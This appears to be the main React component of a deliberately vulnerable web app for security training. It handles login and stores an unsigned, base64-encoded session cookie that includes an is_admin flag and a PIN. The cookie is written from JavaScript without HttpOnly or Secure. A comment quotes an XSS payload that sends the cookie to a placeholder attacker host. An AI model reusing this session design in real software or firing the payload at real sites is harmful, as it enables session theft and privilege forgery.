import React, { useState, useEffect } from 'react';
import Login from './pages/Login.jsx';
import Dashboard from './pages/Dashboard.jsx';

const STORAGE_KEY = 'user';

function getUserFromCookie() {
  const match = document.cookie.match(/(?:^|; )session=([^;]*)/);
  if (!match || !match[1]) return null;
  try {
    const decoded = JSON.parse(atob(match[1]));
    return {
      id: decoded.uid,
      username: decoded.username,
      is_admin: decoded.is_admin,
      encrypted_pin: decoded.pin,
    };
  } catch (err) {
    console.error("Failed to parse session cookie:", err);
    return null;
  }
}

export default function App() {
  const [user, setUser] = useState(null);

  // Restore session from localStorage or session cookie on load
  useEffect(() => {
    const raw = localStorage.getItem(STORAGE_KEY);
    if (raw) {
      try {
        setUser(JSON.parse(raw));
        return;
      } catch {
        localStorage.removeItem(STORAGE_KEY);
      }
    }

    // Auto log-in from session cookie if present in document.cookie
    const cookieUser = getUserFromCookie();
    if (cookieUser) {
      localStorage.setItem(STORAGE_KEY, JSON.stringify(cookieUser));
      setUser(cookieUser);
    }
  }, []);

  function handleLogin(userData) {
    localStorage.setItem(STORAGE_KEY, JSON.stringify(userData));

    // ======================================================================
    // VULNERABILITY: Session cookie set WITHOUT the HttpOnly flag.
    // ----------------------------------------------------------------------
    // A "session token" is written from client-side JavaScript, which means
    // it can never be HttpOnly and is fully readable via `document.cookie`.
    // Combined with the stored-XSS sink in the feed, an injected
    //     <script>fetch('https://ATTACKER/?c='+document.cookie)</script>
    // can exfiltrate this token to an attacker's webhook.
    // ======================================================================
    const sessionToken = btoa(
      JSON.stringify({
        uid: userData.id,
        username: userData.username,
        is_admin: userData.is_admin,
        pin: userData.encrypted_pin,
      })
    );
    // No HttpOnly (impossible from JS), no Secure — deliberately stealable.
    document.cookie = `session=${sessionToken}; path=/; SameSite=Lax; max-age=86400`;

    setUser(userData);
  }

  useEffect(() => {
    console.log(user);
  }, [user])

  function handleLogout() {
    localStorage.removeItem(STORAGE_KEY);
    document.cookie = "session=; path=/; max-age=0";
    setUser(null);
  }

  return user ? (
    <Dashboard user={user} onLogout={handleLogout} />
  ) : (
    <Login onLogin={handleLogin} />
  );
}
